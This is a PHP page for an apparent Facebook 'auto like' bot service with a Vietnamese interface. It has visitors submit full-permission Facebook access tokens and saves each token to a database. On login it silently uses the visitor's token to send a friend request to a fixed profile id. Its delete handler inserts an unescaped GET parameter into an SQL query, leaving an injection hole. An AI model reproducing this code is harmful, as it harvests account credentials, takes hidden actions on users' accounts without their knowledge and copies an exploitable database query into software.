<?php include 'system/head.php'; ?>
<div class="content">
   <div class="row"> 
<div class="col-md-12">
                        <div class="card">
                            <div class="header">
                                <h4 class="title"><i class="fa fa-dashboard" style="margin-right: 5px;"></i>  Đăng Nhập Hệ Thống</h4>
                                <p class="category">Sử Dụng Token Để Đăng Nhập <?php echo $title; ?></p>
                            </div>
                            <div class="content">   

<?php if(!$_SESSION[id]) { ?>
				<!--// Nội Dung Bot Like -->
		<div class="col-md-12">						
			<form action="" method="POST">
		<div class="form-group">
			<label for="usr">Nhập Mã Token:</label>
				<input type="text" class="form-control" name="token">
		</div>
		<button type="submit" class="btn btn-success">Đăng Nhập <?php echo $title; ?></button>
			</form>
		</div>

		<div class="footer">
		<div class="legend">
		</div>
		<hr>
		<div class="stats">
		<i class="fa fa-sign-in"></i>
		<a href="/api/gettoken.php" target="_blank">Đăng Nhập và Lấy Token</a> 
		</div>
		</div>
		
<?php } else {
  ?>
  <div class="panel-heading"><?php echo $title; ?></div>
      <div class="panel-body">
      <div class="form-group">
      <label for="usr">Cài Auto Like (Vui lòng nhập ID):</label><br>
<div class="form-group">
<input type="hidden" id="token_cua_tui" value="<?php echo $_SESSION['token']; ?>">
<textarea class="form-control" rows="1" id="ID_STATUS" value="Nhập ID Status Hoặc ID Profile"></textarea></div>
<button type="button" class="btn btn-info" onclick="Puaru_Like()" >Chạy Auto Like</button> <br/><br/>
<li id="trave" class="list-group-item">Kết Quả Cài Đặt Sẽ Thông Báo Tại Đây. </li></p>

      </div>
      <script>
function Puaru_Like() {
var http = new XMLHttpRequest();
var token_cua_tui = document.getElementById("token_cua_tui").value;
var ID_STATUS = document.getElementById("ID_STATUS").value;
var url = "likesub.php";
var params = "type=like&token_cua_tui="+token_cua_tui+"&ID_STATUS="+ID_STATUS;
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>
<?php }?>

</div></div></div>
</div></div>



<?php
if($_GET[del])
  {
    $infongdung = mysql_fetch_array(mysql_query("SELECT * FROM `botcamxuc` WHERE `id` = '".$_GET[del]."' LIMIT 1"));
    if($infongdung[usercai] != $_SESSION[id])
    {
      die('<script>alert("Không Thể Xoá Tài Khoản Của Người Khác"); </script>');
	  echo '<meta http-equiv=refresh content="0; URL=/index.php">';
      exit;
    }
    else
    {
    mysql_query("DELETE FROM `botcamxuc` WHERE id='" . mysql_real_escape_string($_GET[del]) . "'");
    echo '<meta http-equiv=refresh content="0; URL=/index.php">';
    exit;
  }
  }
if($_POST['token']){
session_start();
    $token2 = $_POST['token'];
  if(preg_match("access_token=(.*?)&expires_in='", $token2, $matches)){
    $token = $matches[1];
      }else{
    $token = $token2;
  }
$check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&access_token='.$token);

if($check[id] == 6628568379){  
  
   mysql_query("CREATE TABLE IF NOT EXISTS `token` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
$com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
$ren = file_get_contents($com);
$_SESSION['id']=$userData['id'];
$_SESSION['name']=$userData['name'];
$_SESSION['token']=$token;



if($userData['id']){
   $row = null;
   $result = mysql_query("SELECT * FROM token WHERE user_id = '" . mysql_real_escape_string($userData['id']) . "'");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("DELETE FROM token WHERE user_id='" . mysql_real_escape_string($userData['id']) . "' AND id != '" . $row['id'] . "'");
      }
   }
   if(!$row){
      mysql_query("INSERT INTO token SET `user_id` = '" . mysql_real_escape_string($userData['id']) . "', `name` = '" . mysql_real_escape_string($userData['name']) . "', `access_token` = '" . mysql_real_escape_string($token) . "'");
   } else {
      mysql_query("UPDATE token SET `access_token` = '" . mysql_real_escape_string($token) . "' WHERE `id` = " . $row['id'] . "");
   }
echo '<meta http-equiv=refresh content="0; URL=/index.php">';

}else{
die('<script>alert("Token đã hết hạn sử dụng ... Vui lòng nhập lại! Vui Lòng F5 Hoặc Tải Lại Trang"); </script>');
session_destroy();
echo '<meta http-equiv=refresh content="0; URL=/index.php">';
}
} else {
    die('<script>alert("Phải Dùng Token iPhone Full quyền Mới Login Được"); </script>');
session_destroy();
echo '<meta http-equiv=refresh content="0; URL=/index.php">';
	}
}
?>
<?php include 'system/foot.php'; ?>